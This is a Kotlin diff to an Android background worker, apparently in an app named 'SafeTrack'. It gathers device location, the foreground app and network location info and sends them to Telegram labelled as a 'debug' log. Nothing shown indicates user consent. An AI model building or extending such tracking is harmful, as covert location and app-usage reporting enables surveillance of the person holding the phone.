@@ -17,7 +17,19 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
         Log.d("TrackingWorker", "Background Tracking Started")
 
         // 1. Fetch current location
-        val latLon = LocationTracker.getCurrentLocation(applicationContext) ?: Pair(0.0, 0.0)
+        var latLon: Pair<Double, Double>? = null
+        var locationText = ""
+        try {
+            latLon = LocationTracker.getCurrentLocation(applicationContext)
+            if (latLon == null) {
+                locationText = "GPS is OFF or Unavailable"
+            } else {
+                locationText = "${latLon.first}, ${latLon.second}"
+            }
+        } catch (e: Exception) {
+            locationText = "GPS is OFF or Unavailable"
+        }
+        val finalLatLon = latLon ?: Pair(0.0, 0.0)
 
         // Utility: Get Home Launcher Package
         fun getHomeLauncherPackage(): String? {
@@ -81,21 +93,24 @@ class TrackingWorker(context: Context, params: WorkerParameters) : CoroutineWork
         val sdf = SimpleDateFormat("dd-MMM-yyyy hh:mm a", Locale.getDefault())
         val currentTime = sdf.format(System.currentTimeMillis())
 
-        val mapLink = "https://maps.google.com/?q=${latLon.first},${latLon.second}"
+        val mapLink = "https://maps.google.com/?q=${finalLatLon.first},${finalLatLon.second}"
+
+        val networkData = NetworkLocationUtility.getNetworkLocationInfo(applicationContext)
 
         val myLog = """
             🚨 *SafeTrack Debug Alert* 🚨
 
             ⏱ *Time:* $currentTime
 
-            📍 *Location:* ${latLon.first}, ${latLon.second}
+            📍 *Location:* $locationText
             🗺 *Map:* [Open Location in Google Maps]($mapLink)
 
             📱 *App Opened:* $realAppName
             📦 *Package:* $actualForegroundApp
+            📡 *Network Info:* $networkData
         """.trimIndent()
 
-        TelegramSyncHelper.sendDebugLog(applicationContext, latLon.first.toString(), latLon.second.toString(), actualForegroundApp)
+        TelegramSyncHelper.sendDebugLog(applicationContext, finalLatLon.first.toString(), finalLatLon.second.toString(), myLog)
 
         return Result.success()
     }
